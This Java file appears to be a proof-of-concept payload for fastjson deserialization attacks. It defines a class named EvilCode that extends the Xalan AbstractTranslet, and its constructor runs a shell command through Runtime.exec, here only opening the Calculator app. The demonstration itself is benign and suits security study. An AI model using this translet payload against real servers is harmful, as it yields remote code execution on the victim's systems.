package com.autoai.fastjson;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

/**
 * @Author:
 * @Date:
 * @Description:
 */
public class EvilCode extends AbstractTranslet {

    public EvilCode() throws IOException {
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static void main(String[] args) throws IOException {
        EvilCode evilCode = new EvilCode();
    }
}